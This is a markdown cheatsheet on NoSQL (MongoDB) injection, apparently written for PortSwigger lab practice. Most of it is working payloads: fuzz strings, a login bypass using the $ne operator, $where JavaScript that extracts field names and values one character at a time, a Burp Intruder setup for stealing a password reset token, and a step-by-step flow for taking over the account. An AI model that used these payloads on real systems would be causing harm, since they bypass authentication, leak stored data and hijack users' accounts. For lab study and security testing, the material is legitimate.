# NoSQL Injection Cheatsheet

## Detection

| Test | Payload | Vulnerable Response |
|---|---|---|
| Fuzz string (URL) | `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00` | Response changes |
| Fuzz string (JSON) | `'\"`{\r;$Foo}\n$Foo \\xYZ\u0000` | Error or different response |
| Single quote | `'` | Syntax error |
| Escaped quote | `\'` | No error → injectable |
| False condition | `' && 0 && 'x` | No results |
| True condition | `' && 1 && 'x` | Normal results |
| `$ne` operator | `{"password":{"$ne":""}}` | Login bypass or different error |
| `$where` false | `{"$where":"0"}` | Invalid credentials |
| `$where` true | `{"$where":"1"}` | Account locked / different response |

---

## Exploitation — Syntax Injection

| Goal | Payload |
|---|---|
| Return all items | `fizzy'\|\|'1'=='1` |
| Bypass released filter | `fizzy'%00` (null byte) |
| False condition | `fizzy' && 0 && 'x` |
| True condition | `fizzy' && 1 && 'x` |

---

## Exploitation — Operator Injection

| Goal | Payload |
|---|---|
| Login bypass | `{"username":"carlos","password":{"$ne":""}}` |
| Test JS injection | `{"$where":"0"}` / `{"$where":"1"}` |
| Count fields | `{"$where":"Object.keys(this).length == N"}` |
| Check field index | `{"$where":"Object.keys(this)[N].match('^.*')"}` |
| Extract field name | `{"$where":"Object.keys(this)[N].match('^.{POS}CHAR.*')"}` |
| Extract field value | `{"$where":"this.FIELDNAME.match('^.{POS}CHAR.*')"}` |
| Verify exact value | `{"$where":"this.FIELDNAME.match('^VALUE$')"}` |

---

## Burp Intruder — Cluster Bomb Setup

### For field name extraction:
```json
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[N].match('^.{§POS§}§CHAR§.*')"}
```
| Payload Set | Type | Values |
|---|---|---|
| Position (§POS§) | Numbers | 0 to 20 |
| Character (§CHAR§) | Simple list | a-z, A-Z, 0-9 |

### For token value extraction:
```json
{"username":"carlos","password":{"$ne":""},"$where":"this.pwResetToken.match('^.{§POS§}§CHAR§.*')"}
```
Same payload setup as above.

**Sort results by:** Payload 1 → then Length  
**Look for:** "Account locked" = correct character ✅

---

## Common MongoDB Operators

| Operator | Use |
|---|---|
| `$ne` | Not equal — bypass equality checks |
| `$in` | Match any value in array |
| `$regex` | Pattern matching — extract data char by char |
| `$where` | Execute raw JavaScript on server |
| `$gt` | Greater than |
| `$lt` | Less than |

---

## Password Reset Token Flow (PortSwigger Labs)

```
1. Extract token field name via Object.keys(this)
2. Extract token value via this.FIELDNAME.match()
3. GET /forgot-password?FIELDNAME=TOKENVALUE
4. Right-click response → Request in browser → Original session
5. Reset password in browser
6. Login with new password
```

⚠️ Token is time-limited — use immediately after extraction

---

## Response Key

| Response | Meaning |
|---|---|
| "Invalid username or password" | Condition = false |
| "Account locked" | Condition = true ✅ |
| 500 Server Error | Syntax error in payload |
| "Invalid token" | Correct endpoint, wrong/expired token |
| "Email sent" | Wrong approach — need browser not Repeater |

---

## Fuzz Characters Reference

| Character | Tests for |
|---|---|
| `'` | Single quote string break |
| `"` | Double quote string break |
| `` ` `` | Backtick / JS template literal |
| `{` | JSON object opener |
| `;` | Statement terminator |
| `$Foo` | MongoDB operator prefix |
| `\xYZ` | Invalid escape sequence |
| `\u0000` | Null byte — truncates query |
